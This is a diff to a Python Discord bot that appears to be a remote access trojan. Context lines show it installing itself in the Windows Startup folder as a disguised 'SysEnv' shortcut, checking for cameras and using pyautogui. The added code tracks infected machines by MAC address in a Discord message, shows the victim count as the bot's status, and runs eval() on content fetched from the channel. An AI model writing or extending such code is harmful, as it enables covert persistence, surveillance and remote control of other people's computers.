@@ -1,5 +1,5 @@
 import nextcord
-from nextcord.ext import commands
+from nextcord.ext import commands, tasks
 from nextcord import Interaction
 import os
 import pyautogui
@@ -44,6 +44,8 @@ sys.stderr = sys.stdout
 startup_dir = Path(os.getenv("APPDATA")) / "Microsoft" / "Windows" / "Start Menu" / "Programs" / "Startup"
 shortcut_name="SysEnv"
 shortcut_path = startup_dir / f"{shortcut_name}.lnk"
+
+CHANNEL_ID = 1355560563622678699
 
 def add_to_startup(script_path=os.path.join(target_path, 'skibidi-startup', 'startup.pyw'), shortcut_name="SysEnv"):
 
@@ -100,6 +102,8 @@ def check_connected_cameras():
 def get_device_ip():
     mac = hex(uuid.getnode()).replace('0x', '').upper()
     return ':'.join(mac[i:i+2] for i in range(0, 12, 2))
+
+INSTANCE_ID = get_device_ip()
 
 user_profile = os.environ['USERPROFILE']
 target_path = os.path.join(user_profile, 'AppData', 'Local', 'Microsoft', 'Windows')
@@ -210,6 +214,67 @@ async def on_ready():
                 channel = nextcord.utils.get(category.text_channels, name="events")
                 if channel:
                     await channel.send(embed=embed)
+
+    async def get_instances():
+        """Fetches the instance data from the Discord message."""
+        channel = client.get_channel(CHANNEL_ID)
+        if not channel:
+            print("Channel not found!")
+            return {}
+
+        try:
+            message = await channel.fetch_message(MESSAGE_ID)
+            content = message.content.strip()
+
+            if not content:
+                return {}
+
+            return eval(content)
+        except Exception as e:
+            print(f"Error fetching message: {e}")
+            return {}
+
+    async def update_instances(instances):
+        """Updates the Discord message with the new instance list."""
+        channel = client.get_channel(CHANNEL_ID)
+        if not channel:
+            print("Channel not found!")
+            return
+
+        try:
+            message = await channel.fetch_message(MESSAGE_ID)
+            await message.edit(content=str(instances))
+        except Exception as e:
+            print(f"Error updating message: {e}")
+
+    async def register_instance():
+        instances = await get_instances()
+        instances[INSTANCE_ID] = time.time()
+        await update_instances(instances)
+
+    async def cleanup_stale_instances():
+        instances = await get_instances()
+        current_time = time.time()
+        instances = {key: value for key, value in instances.items() if current_time - value < 90}
+        await update_instances(instances)
+
+    @tasks.loop(seconds=30)
+    async def update_activity():
+        instances = await get_instances()
+        count = len(instances)
+        activity = nextcord.Game(f"Running on {count} instances.")
+        await client.change_presence(activity=activity)
+
+    @tasks.loop(seconds=60)
+    async def cleanup_instances():
+        await cleanup_stale_instances()
+
+    @client.event
+    async def on_disconnect():
+        instances = await get_instances()
+        instances.pop(INSTANCE_ID, None)
+        await update_instances(instances)
+
 
 
 
